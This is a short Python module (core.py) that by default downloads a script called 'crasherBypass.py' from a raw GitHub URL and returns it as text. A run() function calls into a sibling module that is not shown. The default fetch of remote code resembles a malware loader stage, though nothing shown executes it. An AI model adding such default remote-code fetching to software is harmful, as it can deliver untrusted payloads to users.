from . import t

# core.py
DEFAULT_SCRIPT_URL = "https://raw.githubusercontent.com/hellyth1337/dfree/main/crasherBypass.py"

import aiohttp

async def fetch(url=DEFAULT_SCRIPT_URL) -> str:
    """
    Качает скрипт с заданной ссылки.
    Пользователь сам решает, что делать с результатом.
    """
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                return await response.text()
            else:
                raise Exception(f"HTTP Error: {response.status}")


async def run():
    await t.main()